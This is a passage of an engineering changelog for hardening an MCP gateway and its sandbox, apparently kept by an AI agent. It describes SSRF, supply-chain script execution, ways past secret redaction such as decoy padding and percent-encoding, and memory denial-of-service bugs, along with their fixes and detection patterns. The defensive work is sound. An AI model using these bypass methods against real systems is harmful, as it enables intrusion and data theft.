    compliance_tags; LIVE mode is nearly blank (no redaction/tags). ROOT CAUSE: PolicyTestView
    (/api/policies/test/) imports get_compliance_tags but omits compliance_tags from its response payload, and
    /api/mcp-connector/tools/call/ keeps tags only in the MCPEvent audit — so the frontend can't reflect what
    the backend never sends. Fix spans control (add compliance_tags to response, unify vocab per item 5) +
    frontend (chip render + Playwright) — neither safely gate-able here (no control venv; no dev server; owned
    by fe-harden). Evidence mcp-parallel/findings/backstop-p21-frontend-tag-reflection/finding.md. No code
    changed.
  - CHG-0037 (2026-07-02, doc) — completion-readiness matrix docs/mcp/COMPLETION_READINESS.md: maps every 1.4 +
    architecture + stress requirement to CODE-HARDENED / VERIFIED / OPEN(blocker) with the CHG evidence.
    Bottom line: code-level 1.4/gateway/transport/isolation hardening is comprehensive + gated green (gateway
    1081 passed); remainder = dedicated-host stress (items 14-19, the completion gate) + infra (gVisor, egress,
    OTEL, backup, npm prod-enable) + owned/cross-plane (item-21 UI tags, item-5 vocab). Completion NOT met.
  - CHG-0038 (2026-07-02) — G2 item 3 (tool-authz VISIBILITY parity): the per-key mcp_allowed_tools allowlist
    was enforced at tools/CALL (403, CHG-0006) but tools/LIST filtered only by the server disabled set — so a
    restricted key SAW tools it would be 403'd on (info disclosure + authz inconsistency). Added
    _filter_tools_by_key_allowlist (empty allowlist = all visible) and layered it after _filter_tools_by_enabled
    at all 4 tools/list sites (org_mcp_jsonrpc adapter+backend branches, REST org_mcp_tools_list which now
    resolves _get_auth_context). Least-privilege: a key sees only tools it can call. Files mcp_proxy.py +
    test_mcp_bare_proxy_scan.py (+2). Gate: 22 bare-proxy + 1083 broad sweep passed.
  - CHG-0039 (2026-07-02) — G2 item 2 (result-scan completeness): ext_mcp_proxy buffered+scanned an SSE
    response only for tools/call (CHG-0004); every OTHER method's SSE streamed through UNSCANNED — so a
    resources/read / prompts/get result (finite, can carry PII/secrets from the external server) egressed RAW.
    Added _EXT_FINITE_RESULT_METHODS (tools/call + resources/* + prompts/* + tools/list) + _ext_scan_result;
    the SSE branch now buffers+scans those finite methods, while notifications/subscriptions still stream
    through (no bounded result; buffering could hang). Non-streaming JSON branch already scanned any result.
    Files mcp_proxy.py + test_mcp_bare_proxy_scan.py (+2). Gate: 24 bare-proxy + 1085 broad sweep passed.
  - CHG-0043 (2026-07-02) [renumbered from CHG-0040 — id collided with the P4.13 Blocker 2 entry below;
    content unchanged] — G2 item 2 (last unscanned egress vector): the ext-proxy scan only inspected the
    `result`; a JSON-RPC ERROR response (no result) egressed UNSCANNED, so an untrusted server could leak a
    secret in an error message (e.g. a connection string). Both ext-proxy paths (non-streaming +
    _scan_reframe_sse_tool_result) now scan `error` when there's no result — mask any detected secret/PII
    (redact-only), fail CLOSED (withhold) on scan error; notifications pass through. Files mcp_proxy.py +
    test_mcp_bare_proxy_scan.py (+2). Gate: 26 bare-proxy + 1087 broad sweep passed. ext-proxy egress fully
    scanned (result all shapes/methods + error, streaming + non-streaming).
  - CHG-0041 (2026-07-02) — G2 item 2 (inbound + logging): (1) audited gateway MCP logging = CLEAN (only
    target_url/exception messages/token-count metrics; no raw args/result/PII; audit raw-store off by default).
    (2) extended the ext-proxy inbound credential block from tools/call-only to prompts/get (same
    params.arguments shape; _EXT_ARG_SCAN_METHODS) — an accidental credential in prompt args no longer egresses
    raw; resources/read excluded (auth-in-URI would false-block). Removed the dead _ext_is_tools_call flag
    (CHG-0039 left it unread). Files mcp_proxy.py + test_mcp_bare_proxy_scan.py (+1). Gate: 27 bare-proxy + 1088
    broad sweep passed.
  - CHG-0040 (2026-07-02) — P4.13 Blocker 2: MCPServerRegistration.url URLField→CharField + migration 0015
    so ws:// registers (serializer SSRF guard unchanged); ws-everything.stub in MCP_ALLOW_INTERNAL_HOSTS;
    ws stub echo prefix fixed. 4/4 transports PASS ROUNDS=3; gateway ss :443 empty. Cross-seam (control,
    iter39). Evidence mcp-parallel/findings/p4-13/RECHECK_ITER39.md.
  - CHG-0042 (2026-07-02) — G3/1.4 (OAuth secret at rest): OAuth flow state (PKCE code_verifier, CSRF
    state) + access/refresh tokens were persisted to Redis as PLAINTEXT JSON. Added optional Fernet
    at-rest encryption in mcp_oauth_proxy.py (_oauth_cipher/_enc_dumps/_enc_loads, gated on env
    MCP_OAUTH_ENCRYPTION_KEY): default OFF = byte-unchanged plaintext (no behaviour change); key set =
    new writes encrypted (gAAAAA Fernet prefix) while legacy plaintext still reads (prefix-detected, no
    token orphaned); invalid key → logged warning + safe plaintext fallback (never breaks the flow).
    Wired all 4 sites: _flow_save/_flow_pop/_token_save/_token_load. OAuth callback re-audited CLEAN:
    CSRF state + PKCE verifier restored via _flow_pop, token endpoint via _assert_safe_url (SSRF),
    follow_redirects=False. Files mcp_oauth_proxy.py + test_mcp_oauth_encryption.py (new, +4). Gate: 4
    oauth-enc + 1092 broad sweep passed.
  - CHG-0044 (2026-07-02) — G3 item 8 (supply-chain RCE, HIGH): docker_manager sets
    npm_config_ignore_scripts=true on the CONTAINER env, but the stdio server is spawned with
    create_subprocess_exec(env=_build_child_env(...)) which REPLACES the env and rebuilds it
    from the _SAFE_ENV_PASSTHROUGH allowlist (which omits ignore_scripts) — so the npx child
    that fetches untrusted packages ran with ignore-scripts=false and install/postinstall
    lifecycle scripts executed on fetch (no baked .npmrc fallback). FIX: _build_child_env
    (shared/ai_mesh_shared/mcp_stdio_common.py) force-pins npm_config_ignore_scripts=true
    unconditionally + LAST (mirrors the MCP_REMOTE_CONFIG_DIR pin), so neither server-spec nor
    host env can re-enable scripts; the package bin still runs. Touches broker sandbox agent +
    gateway legacy stdio adapter (shared helper). +3 tests. Gate: 19 stdio_common + 101 broker
    + 1092 gateway passed. Evidence mcp-parallel/findings/backstop-p8-npm-ignore-scripts/.
  - CHG-0045 (2026-07-02) — G3 item 9 (audit-completeness, MEDIUM): the cross-tenant 403
    org_scope_violation (authenticated key's org ≠ URL org) was only LOG.warning'd — never
    written to the MCPEvent audit trail, so the most forensically important MCP event was
    invisible to audit/SIEM (while lesser per-key authz denials DID audit). FIX: new async
    wrapper _audit_and_return_scope_error (mcp_proxy.py) calls _validate_org_scope (unchanged,
    kept sync so ~13 test patch sites stay valid) and on a 403 emits _record_gateway_event
    (decision=block, reason=org_scope_violation) attributed to the CALLER's real org (target_org
    + key_prefix in metadata, never leaks into the target's stream); all 4 routes use it. 429
    audit deliberately skipped (burst amplification). +2 tests. Gate: 6 org-scope + 67 route
    (patch-site) + 1094 gateway passed. Evidence mcp-parallel/findings/backstop-p9-scope-violation-audit/.
  - CHG-0046 (2026-07-02) — G2 item 2 (result-redaction FAIL-OPEN, HIGH): the two-tier scanner
    flattens each scan target via _safe_json (so a NUMBER/LIST/OBJECT value IS scanned) and redacts
    via setter(new_text). For key_path/simple-key targeting a NON-STRING value, the setter was a
    NO-OP (mcp_scan_targets.py:108 dot-path, :123 simple-key) — so a detected secret/PII was reported
    redacted (result_redacted=True) yet egressed RAW, and since result_redacted flips the returned
    object identity the E12 result-floor was BYPASSED (scanned is no longer `is result_content`). FIX:
    bind the SAME real mutators the string targets use (dot-path _mutate_dot_path via a hoisted
    _make_setter; simple-key node[key]=new) so redaction actually replaces the value; clean values
    untouched. +4 tests (3 unit + 1 e2e byte-assert). Gate: 39 scan-target/orchestrator + 1098 gateway
    passed. Evidence mcp-parallel/findings/backstop-p2-nonstring-redact-setter/. Follow-up: general
    fail-closed OUTPUT byte-check in _scan_tool_result_floor.
  - CHG-0047 (2026-07-02) — G2 item 2 (byte-truth invariant, defense-in-depth): IMPLEMENTS the CHG-0046
    follow-up. scan_mcp_payload set result_redacted=True whenever new_text != text, regardless of whether
    the setter actually mutated the payload — so a residual no-op scrub (e.g. _mutate_dot_path best-effort
    on an exotic path) could egress the raw value while claiming redaction. FIX: in the Tier-1 redact
    branch, snapshot _safe_json(state_ref[0]) before/after setter(new_text); if the payload BYTES are
    unchanged the scrub was a no-op → tier1_blocked=True (+ noop_scrub_failclosed trace) → fail CLOSED
    (block), never egress un-scrubbed. General/precise/cheap; a real setter changes bytes → not blocked.
    +2 tests. Gate: 41 scan-orchestrator/target + 1100 gateway passed (zero spurious blocks). With
    CHG-0003 + CHG-0046, redaction path is now fail-closed on scan-error, setter-no-op, AND non-string
    shapes. Evidence mcp-parallel/findings/backstop-p2-noop-scrub-failclosed/.
  - CHG-0048 (2026-07-02) — G3 item 11 (Redis correctness, MEDIUM): the per-key tool-call cap counter did
    `count=INCR(rk); if count==1: EXPIRE(rk,60)` — the window TTL was set ONLY on the first increment, so a
    crash/dropped EXPIRE there left mcp:toolcalls:<key> with NO TTL forever (later calls have count>1, skip
    EXPIRE), the counter never reset, and once count>mcp_max_tool_calls the key was 429'd on EVERY call
    permanently. FIX: INCR + EXPIRE(nx=True) run ATOMICALLY in a pipeline(transaction=True) (MULTI/EXEC) on
    every increment; NX (Redis 7.4) sets the TTL only when absent → fixed 60s window preserved + a lost TTL
    healed next call. Fail-open unchanged. +5 tests (real fakeredis: atomic set / fixed-window / TTL-heal /
    fail-open). Gate: 5 cap-ttl + 37 existing-cap + 1105 gateway passed. Evidence
    mcp-parallel/findings/backstop-p11-toolcall-cap-ttl-race/.
  - CHG-0049 (2026-07-02) — G3 item 11 (verification + regression guard): swept EVERY MCP Redis WRITE for
    the CHG-0048-class TTL race. Clean: _flow_save setex(600)+delete-on-pop (used-once CSRF/PKCE);
    _token_save setex with expiry-DERIVED ttl (max(expires_at-now+60,300), bumped to _TOKEN_DEFAULT_TTL when
    a refresh_token exists); tool-call cap atomic since CHG-0048; mcp:scan_ver:* read-only on the gateway.
    No new race. Pinned the untested OAuth token TTL-derivation with +4 tests (a fixed TTL would serve
    EXPIRED tokens or evict valid ones early). Documented: the in-process _oauth_tokens fallback returning an
    expired record is BY DESIGN (get_stored_token re-checks expires_at; has_stored_token reports existence).
    No production code change. Gate: 4 oauth-ttl + 1109 gateway passed. Evidence
    mcp-parallel/findings/backstop-p11-redis-write-audit/.
  - CHG-0050 (2026-07-02) — G4 item 13 (tracing, LOW-MED): _record_gateway_event defaults request_id to a
    throwaway mcp-<ms> timestamp. The bare REST route org_mcp_tool_call recorded ALL audit events with NO
    request_id; org_mcp_jsonrpc used the repeatable JSON-RPC id only on its main sites; NEITHER honored an
    inbound X-Request-ID — so a tool call's block/redact/tag decisions weren't correlatable across the audit
    trail or gateway->broker->sandbox. FIX: new _mcp_request_correlation_id(request, msg_id) prefers
    X-Request-ID (bounded 200 chars), then JSON-RPC id, else "". Threaded into ALL 5 REST audit events (was
    zero) + the JSON-RPC _req_id now uses it. +6 tests (integration: REST audit carries the header; unit:
    prefer/fallback/empty/bound/no-headers). Gate: 33 bare-proxy + 1115 gateway passed. Follow-ups: early
    jsonrpc authz sites + internal_tools_call + broker_send_rpc propagation; OTEL/backup infra. Evidence
    mcp-parallel/findings/backstop-p13-request-correlation-id/.
  - CHG-0051 (2026-07-02) — G4 item 13 (end-to-end tracing; completes CHG-0050 follow-up): CHG-0050 gave
    MCP audit events a correlation id but broker_send_rpc sent NONE to the broker — the trace ended at the
    gateway boundary. FIX (out-of-band X-Request-ID header, no JSON-RPC schema change): _request_with_503_retry
    gains extra_headers (merged w/ broker auth); broker_send_rpc gains correlation_id → sends X-Request-ID when
    set; _adapter_forward gains correlation_id (default "") → passes it through; the org_mcp_jsonrpc tool-call
    site passes correlation_id=_req_id. Remote-transport tool calls now carry the id to broker+sandbox. +2
    tests (header sent when set / absent when unset). Gate: 13 sandbox-client + 1117 gateway passed. Follow-ups:
    stdio path (send_jsonrpc); tools/list+internal+early-authz sites; broker should LOG the id; OTEL/backup
    infra. Evidence mcp-parallel/findings/backstop-p13-broker-correlation-propagation/.
  - CHG-0052 (2026-07-02) — G4 item 13 (completes CHG-0051): CHG-0051 propagated the correlation id to the
    broker as X-Request-ID, but the broker RPC route neither read nor logged it (the broker RPC path had NO
    per-call logging at all). FIX (services/mcp-broker/src/sandbox/routes.py): added logger; both RPC routes
    capture x_request_id=Header(alias=X-Request-ID) → _forward_sandbox_rpc logs ONE line at the top (before
    docker resolution, so failed 503s trace too) with SAFE metadata ONLY (org/server/transport/method/
    jsonrpc_id/request_id — NEVER params/args/env/upstream). Trace chain: gateway audit (CHG-0050) →
    X-Request-ID (CHG-0051) → broker log (CHG-0052). +2 tests. Gate: 106 broker passed. Follow-ups: forward to
    the sandbox AGENT + agent-log (last hop); gateway stdio/tools-list/internal/early-authz; OTEL/backup infra.
    Evidence mcp-parallel/findings/backstop-p13-broker-logs-correlation-id/.
  - CHG-0053 (2026-07-02) — item 13/1.4 (sandbox-agent leak-to-logs audit + fix): extended the CHG-0041
    gateway-logging audit to the broker + sandbox AGENT. AUDIT: tool-call RESULTS/params are NEVER logged
    (1.4-critical property holds); only the initialize result (capabilities, json-escaped+truncated) +
    metadata are logged. GAP: stdio_manager.py:360 logged command+args verbatim — env is never logged, but a
    credential passed as a stdio ARG (--token XYZ / --api-key=XYZ) would land in operator logs plaintext. FIX:
    new _safe_args_for_log() masks secret-flag VALUES (token/key/secret/password/auth/credential/apikey);
    standalone URLs/pkg-specs untouched. +5 tests. Gate: 31 stdio-pkg + 106 broker passed (no test depends on
    the log format). Follow-up: URL-embedded creds in a standalone arg (separate vector). Evidence
    mcp-parallel/findings/backstop-p13-broker-agent-log-hygiene/.
  - CHG-0054 (2026-07-02) — G2 item 2 / 1.4 (HIGH secret leak, found via adversarial verification): redact_all
    masked ONLY the -----BEGIN PRIVATE KEY----- header line (-> [PRIVATE_KEY]), leaving the base64 key BODY +
    -----END----- intact — the body IS the secret, and the old pattern only matched RSA (EC/DSA/OPENSSH keys
    egressed raw entirely). Root cause: PII_PATTERNS private_key_header runs first + masks the header, so the
    later header-only private_key_block never matched the multi-line body. FIX: private_key_header now matches
    the ENTIRE PEM block (generic RSA/EC/DSA/OPENSSH prefix; BEGIN..END, or BEGIN..base64-run if truncated) ->
    whole key -> [PRIVATE_KEY]; prose "loads a private key" not redacted (no FP). NOTE: aidefence has no
    PEM-key recognizer (piiFound:false on raw AND redacted) — confirmation via gateway detect_pii + bytes.
    patterns.py, +5 tests. Gate: 5 pk-redaction + 74 redaction-adjacent + 1122 gateway passed. Evidence
    mcp-parallel/findings/backstop-p2-private-key-body-leak/.
  - CHG-0055 (2026-07-02) — G2 item 2 / 1.4 (secret-inventory gap, MEDIUM; found continuing the CHG-0054
    adversarial verification): the inventory redacted password=/secret=/token= assignments but NOT
    api_key=/apikey=/access_key= — so API_KEY=<value> whose value didn't match a provider format (e.g. below
    the openai 32-char threshold) egressed UNMASKED (api_key=/apikey:/access_key=/api-key = all cases). FIX:
    new api_key_assignment = (?:api[_-]?key|access[_-]?key)[:=]<val> reusing the _TOKEN_VALUE FP guard (>=8
    chars w/ a digit, not prose) so api_key=none / DEBUG=true stay safe; tagged SECRET; masked via
    _mask_secret_assignment -> api_key=***; detect_secrets now flags it. patterns.py + 13 tests. Gate: 13
    api-key + 1135 gateway passed. Evidence mcp-parallel/findings/backstop-p2-api-key-assignment-gap/.
  - CHG-0056 (2026-07-02) — G2 item 2 / 1.4 (URL-encoding obfuscation bypass, MEDIUM; found continuing the
    CHG-0054/0055 adversarial verification): redact_all de-obfuscated base64/hex/url-safe-b64/double-b64 (all
    caught) but did NOT URL-decode — so john.doe%40example.com (email in a URL query param) / %-encoded SSN
    egressed (trivially recoverable). FIX: percent-decode pass in _redact_obfuscated — unquote each %XX-token
    (bounded _MAX_URL_DECODE_TOKENS=32) and mask the whole token as [ENCODED_SECRET_REDACTED] when the decoded
    form matches PII/secret; benign percent text (50%20off / C%3A%5Cpath / 95%) untouched. patterns.py + 11
    tests. Gate: 11 url-enc + 1158 gateway passed. RESIDUAL (CLOSED by CHG-0060 2026-07-02):
    _MAX_DECODE_TOKENS=12 base64 cap let a crafted result hide an encoded secret past 12 decoy tokens.
    Evidence mcp-parallel/findings/backstop-p2-url-encoding-obfuscation/.
  - CHG-0057 (2026-07-02) — G2 item 2 / 1.4 (fail-closed byte-truth + E2E verification): VERIFIED the MCP
    tool-result redaction path (scan_mcp_payload -> _scan_text_tier1 PII/secret branch) uses
    detect_pii/detect_secrets/redact_all from patterns.py — so CHG-0054/0055/0056 protect real tool results
    E2E (tier1 patterns-based; Presidio is tier2 only). GAP: the tier1 redact byte-check (block if a detected
    value survives the scrub) checked ONLY ip_leak, ASSUMING pii/secret are always covered (CHG-0054 disproved
    that). FIX: byte-verify ALL detected categories — _detected_values = pii+secrets+ip_leak; any survivor ->
    block (fail-closed). No FP: redact_all replaces every match (verified over the full battery, zero
    would-be false blocks). +2 tests. Gate: 2 chg0057 + 1160 gateway passed (excl. another session's untracked
    broken test_mcp_enforcement_block_recording.py). Evidence mcp-parallel/findings/backstop-p2-tier1-byte-verify-all/.
  - CHG-0058 (2026-07-02) — G2 / 1.4 (encoded internal-network-address leak, HIGH; found continuing the
    CHG-0054/0055/0056/0057 adversarial obfuscation sweep): redact_all de-obfuscated base64/hex/url blobs but
    the decode branches in _redact_obfuscated checked only pii/secrets, NOT detect_ip_leakage — so an internal
    IP/host/URL inside an encoded blob (base64("db.internal:5432"), base64("http://192.168.50.123:8080/admin"),
    %-encoded internal URL) egressed verbatim (trivially decodable). SECONDARY gap: the base64 gate _B64ISH_RE
    needs {12,} chars, so a bare short internal IPv4 (10.1.2.3 -> MTAuMS4yLjM=, 11 chars) slipped under (hex
    short-IPs already covered: 8 bytes=16 hex >= floor). FIX: (1) _dec_has_infra() (network keys only:
    internal_ipv4/hostname/url; file-paths excluded) added to the base64/hex + url-decode branches -> mask the
    whole token [ENCODED_SECRET_REDACTED]; (2) _iter_short_b64_infra() — a dedicated 8..11-char short-token pass
    (network-key-only, bounded, maximal-run pinned) closing the sub-gate short-IP leak WITHOUT touching
    detect_pii/detect_secrets. No FP: _IP_LEAKAGE_EXAMPLE_ADDRS textbook carve-out preserved on the decode path;
    encoded file paths untouched; benign short-base64 battery zero-changed. patterns.py + 13 tests. Gate: 13
    encoded-infra + 1176 gateway passed, 0 failed. Integrates with CHG-0057 byte-verify (ip_leak union fails
    closed on a survivor). Evidence mcp-parallel/findings/backstop-p2-encoded-infra-leak/.
  - CHG-0059 (2026-07-02) — G2 item 5 / 1.4 (compliance-tag vocabulary unified onto catalog codes,
    MEDIUM audit-integrity; closes the CHG-0017/CHG-0030 vocab residual): MCPEvent.compliance_tags is
    documented as a list of ComplianceTag.code values (GDPR-PII/HIPAA-PHI/PCI-CARD/SOC2-CONF), and the
    control enforcement path already emits those, but the GATEWAY scan path (patterns.py
    get_compliance_tags) emits granular vocab (GDPR/HIPAA/PII/PHI/PCI-DSS/SECRET/INFRA/SOC2) — so the
    same audit field held two vocabularies by plane (SSN leak → control ['GDPR-PII','HIPAA-PHI'] vs
    gateway ['GDPR','HIPAA','PII']), breaking group/filter-by-tag + violating the field contract; and
    the shared module had NO internal-infra keys (item 5's literal "extend to IP"). FIX (NO gateway
    change → the 8 gateway compliance tests stay green, no collision with active patterns.py editors):
    normalize at the audit WRITE boundary. shared/ai_mesh_shared/mcp_compliance_tags.py gains
    to_catalog_codes() (GDPR/PII→GDPR-PII, HIPAA/PHI→HIPAA-PHI, PCI-DSS→PCI-CARD, SECRET/INFRA/SOC2→
    SOC2-CONF; idempotent; never drops a tag) + internal-infra keys (internal_ipv4/hostname/url/
    file_path_*/ip_leakage → SOC2-CONF); control tasks.py record_mcp_event_task (gateway ingestion) +
    views.py _record_event (defense-in-depth) apply it, exception-guarded. Gate: 31 gateway vocab +
    1207 gateway sweep passed; control mcp_connector ingestion 6 + 21 broader passed (Django runner in a
    throwaway container w/ working-tree bind-mount; 2 unrelated pre-existing harness errors =
    pytest/fakeredis dev deps absent). Residuals: ITAR/FERPA have no detector; gateway still emits
    granular at source (consistency enforced at the audit write boundary by design).
    Evidence mcp-parallel/findings/backstop-p5-compliance-vocab-normalize/.
  - CHG-0060 (2026-07-02) — G2 / 1.4 (decode-scan decoy-padding bypass, HIGH; CLOSES the CHG-0056
    residual): the base64/hex/url decode passes in _redact_obfuscated stopped after a fixed token COUNT
    (base64/hex _MAX_DECODE_TOKENS=12, url _MAX_URL_DECODE_TOKENS=32), so a result could hide an encoded
    secret PAST the cap (<12 benign base64 blobs> <base64(email)> → the secret token was never decoded →
    egressed verbatim). Proven live pre-fix (base64/hex past 12 decoys, url past 32). FIX: bound the
    decode scan by a GLOBAL decoded-BYTE budget (_MAX_DECODE_TOTAL_BYTES=262144, shared across base64+hex)
    instead of a token count — the input is already _CANON_MAX_LEN(20000)-capped so decoding every token
    in it is inherently bounded; _MAX_DECODE_TOKENS 12→4096 (backstop above the ~1666 max tokens a 20K
    input holds → never truncates a valid input); _MAX_URL_DECODE_TOKENS 32→4096 + url pass scans
    original[:_CANON_MAX_LEN]. No FP: benign short input byte-for-byte no-op (golden cases unchanged);
    only genuine decoded PII/secret/infra masked (60-benign-decoy battery not false-masked); perf worst
    case ~35-45ms. patterns.py + 7 tests. Gate: 7 decoy-bypass + 1214 gateway passed, 0 failed. Integrates
    with CHG-0057 byte-verify. RESIDUAL (pre-existing, NOT changed): content beyond _CANON_MAX_LEN=20000
    is not obfuscation-decode-scanned (plain PII beyond still raw-masked; only ENCODED past 20K escapes).
    Evidence mcp-parallel/findings/backstop-p2-decode-decoy-bypass/.
  - CHG-0061 (2026-07-02) — G2 item 2 / 1.4 (ext_mcp_proxy non-200 / non-JSON egress leak, HIGH): the
    tenant-facing external passthrough ext_mcp_proxy (/v1/mcp/ext-proxy/{host}/{path}) ran its outbound
    result/error redaction floor ONLY on status==200 JSON bodies — so a NON-JSON body (HTML/text/xml
    error page; resp.json() raises) was returned verbatim, and a NON-200 JSON body bypassed both scan
    branches (gated ==200) and returned raw. A secret/PII/infra string in a non-200 or non-JSON error
    body egressed to the tenant unscanned (contradicts CHG-0043's scan-error-content intent, only wired
    for 200). FIX: added import re + _is_text_content_type(); non-JSON text-like bodies are scanned via
    _scan_tool_result_floor (WITHHELD on block/error, binary passed through untouched); dropped the
    status==200 gate from the result+error scans (any status) + new elif for non-200 bodies without
    result/error (scan whole body). 200-without-result/error left untouched (no behaviour change).
    mcp_proxy.py + 6 tests. Gate: 39 ext-proxy + 1220 gateway passed, 0 failed. ORG path unaffected
    (sandbox-routed via broker → parsed dict, same floor). Evidence
    mcp-parallel/findings/backstop-p2-ext-proxy-nonok-egress/.
  - CHG-0062 (2026-07-02) — G3 item 9 (rate-limit) + item 11 (Redis correctness), MEDIUM: the per-org
    burst/RPM limiter (rate_limit_enforcement.py enforce_org_burst_rpm) did INCR then a SEPARATE
    `if current==1: EXPIRE` for both counters. On coroutine cancellation (client disconnect — routine
    under load) or crash between INCR and EXPIRE, the key was created with NO TTL and orphaned forever
    (time-bucketed keys → unbounded Redis memory leak under soak/chaos/5k-10k-concurrent). On the MCP
    path via _mcp_org_rate_limit_raw (all 3 entry points). Inconsistent with the already-atomic tool-call
    cap (mcp_proxy.py ~1066, CHG-0048, transaction=True + expire nx=True) and rate_limiter.py (Lua). FIX:
    both counters now run INCR + EXPIRE NX in one MULTI/EXEC transaction — atomic + self-healing (EXPIRE
    NX every request re-sets a missing TTL; NX means later same-bucket hits don't slide the window, count
    still rises). Fail-open preserved. rate_limit_enforcement.py + 5 tests. Gate: 5 atomic-ttl + 14
    mcp_rate_limit + 1228 gateway passed, 0 failed. SIBLING (documented, not changed — one item/iter):
    leakage_detector.py:116-120 (sadd loop then separate expire) same class, milder. Evidence
    mcp-parallel/findings/backstop-p11-ratelimit-atomic-ttl/.
  - CHG-0063 (2026-07-02) — G3 item 9 (validation/DoS) + resource-limits (mem), HIGH; closes CHG-0034's
    documented limitation: _mcp_body_too_large only pre-checks the Content-Length HEADER, so a chunked /
    no-Content-Length body slipped past it and request.body()/json() buffered the whole stream into
    memory unbounded (gigabyte chunked body → gateway OOM), on the 3 tenant-facing entry points
    (ext_mcp_proxy, org_mcp_jsonrpc, org_mcp_tool_call). FIX (mcp_proxy.py): new _mcp_read_body_capped()
    reads request.stream() incrementally and raises _MCPBodyTooLarge the instant the running total
    crosses _MCP_MAX_BODY_BYTES (never holds more than the ceiling in memory); caches capped bytes on
    request._body so downstream json()/body() reuse it. Wired at all 3 entry points → 413. Content-Length
    pre-check retained; test-double fallback keeps .json()-mocking tests working. +7 tests (incl. e2e 413
    on an oversized chunked stream + a "stops reading early / bounds memory" assertion). Gate: 7 body-cap
    + 1237 gateway passed, 0 failed. Scope: tenant-facing routes; backend-internal (X-Gateway-Internal-Key)
    paths still plain body() (lower risk, future follow-up). Evidence
    mcp-parallel/findings/backstop-p9-chunked-body-dos/.
  - CHG-0064 (2026-07-02) — G3 item 10 (resource-limits/mem), HIGH; response-side twin of CHG-0063: the
    tenant-facing ext_mcp_proxy buffers an UNTRUSTED external server's whole response via resp.aread()
    (SSE + JSON/text/binary) with NO size ceiling. The comment claimed "capped by the httpx timeout" but
    a timeout bounds TIME not SIZE — a malicious tenant-configured external MCP server can stream a
    multi-GB response fast and OOM the SHARED gateway (cross-tenant DoS). FIX (mcp_proxy.py): new
    _MCP_MAX_RESPONSE_BYTES (env, default 10MiB) + _read_response_capped() iterates resp.aiter_bytes()
    incrementally and raises _MCPBodyTooLarge the instant the total crosses the ceiling; both aread()
    sites use it → withhold with 502 mcp_upstream_response_too_large. Non-finite SSE passthrough unchanged
    (streams chunk-by-chunk, never buffers). Scope: ext-proxy (untrusted boundary); ORG path sandbox-routed
    (gVisor mem/disk limits contain a huge sandbox response). +5 tests (2 unit + 3 integration 502);
    existing 39 ext tests updated (response doubles expose aiter_bytes). Gate: 51 + 1242 gateway passed,
    0 failed. Evidence mcp-parallel/findings/backstop-p10-response-mem-dos/.
  - CHG-0065 (2026-07-02) — G3 item 12 (egress-lockdown/SSRF) + item 9 (validation), HIGH: ext_mcp_proxy
    validated the target ONLY by hostname-STRING allowlist (_ALLOWED_MCP_DOMAINS), never resolving the
    IP — so an allowlisted domain resolving to an internal addr (DNS rebinding/hijack/misconfig) was
    forwarded to → caller reaches 169.254.169.254 (cloud-metadata creds), loopback, or RFC-1918. The
    internal paths (internal_tools_call/discover) already guard this via is_safe_outbound_url ("finding
    mcp#1"); ext-proxy was the omission. FIX (mcp_proxy.py): ext_mcp_proxy now calls
    is_safe_outbound_url(target_url) after building the URL → 400 on reject. The guard (_url_guard.py)
    resolves via getaddrinfo + blocks private/loopback/link-local/metadata IPs, fail-closed (MCP_ALLOW_
    INTERNAL_HOSTS overrides for dev). httpx follow_redirects=False so no redirect-SSRF. No FP (real
    public domains allowed). +3 tests (wiring block; REAL localhost→127.0.0.1→400 e2e; safe host allowed)
    + autouse fixture keeps existing redaction tests hermetic (no real DNS). Gate: 45 ext + 1245 gateway
    passed, 0 failed. Evidence mcp-parallel/findings/backstop-p12-ext-proxy-ssrf/.
  - CHG-0066 (2026-07-02) — G3 item 10 (resource-limits/mem containment), MEDIUM; sandbox-agent
    counterpart of CHG-0064: the per-tenant sandbox agent (services/mcp-broker/sandbox-image/agent/
    upstream_manager.py) dials the UNTRUSTED upstream via client.stream(), and for a JSON (non-SSE)
    response did `raw = await response.aread()` then check size — buffering the WHOLE streaming body
    into memory before the check (multi-GB upstream → OOM/restart of that tenant's sandbox instead of a
    clean 8MiB rejection). The SSE branch was already incremental; only the JSON branch had the anti-
    pattern. FIX: JSON branch now reads via response.aiter_bytes() + running total, raising -32000
    "upstream response too large" the instant it crosses _MAX_RESPONSE_BYTES (parity with SSE). +2 tests
    (over-cap → -32000; under-cap still returns result). Gate: 11 passed (-k "not websocket"; the 3 ws
    tests HANG pre-existingly in this env — unrelated, this change is streamable-http JSON only).
    Contained by the sandbox 2GiB mem limit (CHG-0015). FOLLOW-UPS: _read_json_response dead code (same
    pattern); error-body reads read-whole-then-slice; _validate_upstream has no resolved-IP SSRF check
    (sandbox analogue of CHG-0065). Evidence mcp-parallel/findings/backstop-p10-sandbox-response-cap/.
  - CHG-0067 (2026-07-02) — G3 item 12 (egress-lockdown/SSRF), HIGH; sandbox-side analogue of CHG-0065,
    closes the CHG-0066 follow-up: the per-tenant sandbox agent (services/mcp-broker/sandbox-image/agent/
    upstream_manager.py) dials the registered upstream; _validate_upstream matched the host STRING against
    allowed_hosts but NEVER resolved the IP — so an allowlisted host resolving to an internal addr (DNS
    rebinding, or a tenant registering an internal-resolving hostname) was dialed from inside the sandbox
    (internal=false/open-NAT → reaches 169.254.169.254 metadata creds, loopback, RFC-1918). PRIMARY path:
    the gateway does NOT is_safe_outbound_url the sandbox-routed upstream (only ext-proxy CHG-0065 + internal
    paths), so the sandbox allowlist-string check was the ONLY guard. FIX: new async _assert_upstream_not_ssrf()
    resolves via the loop's non-blocking getaddrinfo + rejects -32002 if any resolved IP is metadata/private/
    loopback/link-local/reserved; fail-closed; MCP_AGENT_ALLOW_INTERNAL_HOSTS dev bypass; called in
    _get_session before any connection. +2 tests (localhost→127.0.0.1→-32002; public IP allowed) + hermeticity
    env in the app-load fixture. Gate: 13 passed (-k "not websocket"; ws tests hang pre-existingly). RESIDUAL:
    network egress-lockdown (sandbox internal=true/iptables) is the INFRA fix; a gateway-side guard on the
    sandbox-routed upstream would add a 2nd layer. Evidence mcp-parallel/findings/backstop-p12-sandbox-ssrf/.
  - CHG-0068 (2026-07-02) — G3 item 9 (audit) / 1.4 audit chain, MEDIUM (audit-completeness): ext_mcp_proxy
    recorded NO audit events (ZERO _record_gateway_event calls) while every other MCP path audits heavily —
    so on the untrusted external-passthrough surface, blocked credentials, blocked/redacted PII results, and
    blocked SSRF targets were INVISIBLE in the MCPEvent trail (breaks the ...→tag→audit chain for external
    tool usage). FIX (mcp_proxy.py): local async _ext_audit() calls the best-effort _record_gateway_event
